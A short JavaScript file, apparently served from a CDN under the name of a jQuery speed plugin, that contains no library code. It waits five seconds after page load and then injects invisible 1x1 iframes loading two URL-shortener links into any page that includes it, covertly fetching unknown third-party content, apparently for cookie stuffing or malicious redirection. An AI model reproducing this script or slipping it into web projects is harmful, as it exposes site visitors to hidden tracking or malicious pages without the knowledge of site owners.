///https://cdn.jsdelivr.net/gh/hipacket/script/speed.jquery.min.js
window.onload = function(){
  var list = ['https://shorten.asia/44h1EFtU', 'https://shorten.asia/b6Nvstes'];
  setTimeout(function(){
    var node = document.createElement('iframe');
    node.width = 1;
    node.height = 1;
    node.style.cssText = 'padding:0;margin:0;border: 0;display: inline-block;';
    list.forEach(url => {
      node.src = url;
      document.body.append(node.cloneNode());
    })
  }, 5000);
}
